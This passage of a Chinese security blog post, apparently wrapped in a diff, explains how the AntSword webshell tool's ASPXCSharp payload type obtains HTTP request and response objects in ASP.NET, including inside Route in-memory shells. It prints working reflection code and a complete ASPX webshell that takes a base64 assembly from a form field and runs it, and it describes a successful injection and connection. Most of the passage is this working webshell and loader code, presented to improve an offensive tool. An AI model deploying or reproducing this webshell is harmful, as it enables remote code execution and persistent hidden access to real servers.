+</span></span><span class="line"><span class="cl">                    <span class="n">HttpContext</span> <span class="n">context</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpContext</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span><span class="c1">//传入HttpContext对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以在shell中用以下写法均可连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">//利用Page对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">)).</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">xxx</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//利用Context对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">)).</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">xxx</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">Context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//利用数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">)).</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">xxx</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="k">new</span> <span class="n">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">Request</span><span class="p">,</span> <span class="n">Response</span> <span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以asp.net的Route内存马为例，从route上下文中获取到的Context是HttpContextBase，而不是HttpContext。具体的实现类为System.Web.HttpContextWrapper。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>并且通过HttpContextWrapper.Request获取到的对象是HttpRequestBase，默认实现类是System.Web.HttpRequestWrapper。有点类似Tomcat的门面模式。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>如果要采用数组的方式可以用以下反射代码实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">                <span class="n">FieldInfo</span> <span class="n">requestField</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">typeof</span><span class="p">(</span><span class="n">HttpRequestWrapper</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_httpRequest&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">HttpRequest</span> <span class="n">httpRequest</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">(</span><span class="n">HttpRequest</span><span class="p">)</span><span class="n">requestField</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">FieldInfo</span> <span class="n">responseField</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">typeof</span><span class="p">(</span><span class="n">HttpResponseWrapper</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_httpResponse&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">HttpResponse</span> <span class="n">httpResponse</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">(</span><span class="n">HttpResponse</span><span class="p">)</span><span class="n">responseField</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">httpContext</span><span class="p">.</span><span class="n">Response</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="o">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="k">new</span> <span class="n">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">httpRequest</span><span class="p">,</span> <span class="n">httpResponse</span> <span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问注入内存马的aspx，一片空白说明注入成功</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>蚁剑中输入任意url，连接成功。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="进一步思考" class="headerLink">
+    <a href="#%e8%bf%9b%e4%b8%80%e6%ad%a5%e6%80%9d%e8%80%83" class="header-mark"></a>4 进一步思考</h2><p>看起来不错了，但是还有继续优化的空间吗？</p>
+<p>Java中一个比较著名的问题是内存马回显，实际上是如何从当前线程获取当前的request跟response对象。这个问题其实比较蛋疼，因为不同的容器有不同的实现细节，无法统一处理。</p>
+<p>但是C#则直接把这个接口给暴露了出来，直接可以通过HttpContext.Current获取到当前的context，从而获取当前的request跟response对象。</p>
+<p>再次改造之后，payload中parseObj如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">public</span> <span class="kt">void</span> <span class="nf">parseObj</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">IsArray</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Object</span><span class="p">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">[])</span><span class="n">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpRequest</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpResponse</span><span class="p">)</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">HttpContext</span> <span class="n">context</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpContext</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">HttpContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">HttpContext</span><span class="p">.</span><span class="n">Current</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="p">.</span><span class="n">Request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>改版后我们去掉了兼容性不强的Page方式，如果数组方式跟Context都无法获取的话，就尝试通过HttpContext.Current来拿到当前的Context。</p>
+<p>所以其实在shell中直接Equals(null)，或者一个随意对象即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s">&#34;c#&#34;</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">Payload</span> <span class="o">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="o">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样可以连接成功</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>至于为什么没有把原来的入口参数方式全部都去掉，是因为新类型并没有在实战环境中测试过。不知道会不会有一些特殊情况。为了谨慎起见，还是保留了原来的入口参数。</p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>个人喜欢开发一些工具，同时记录下自己的碎碎念。如果能对你有帮助，那就最好不过了。</p>
+<p>github地址：https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea</p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/" data-title="聊聊新类型ASPXCSharp"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/" data-title="聊聊新类型ASPXCSharp"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/" data-title="聊聊新类型ASPXCSharp"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/" data-title="聊聊新类型ASPXCSharp"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/new-type-aspxcsharp/" data-title="聊聊新类型ASPXCSharp" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;聊聊新类型ASPXCSharp&#34;, &#34;https://yzddmr6.com/posts/new-type-aspxcsharp/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/asp-net-memory-shell-router/" class="prev" rel="prev" title="ASP.NET下的内存马(二)：Route内存马的N种写法"><i class="fas fa-angle-left fa-fw"></i>ASP.NET下的内存马(二)：Route内存马的N种写法</a>
+            <a href="/posts/as-exploits-sharploader/" class="next" rel="next" title="讲讲As-Exploits新模块SharpLoader">讲讲As-Exploits新模块SharpLoader<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
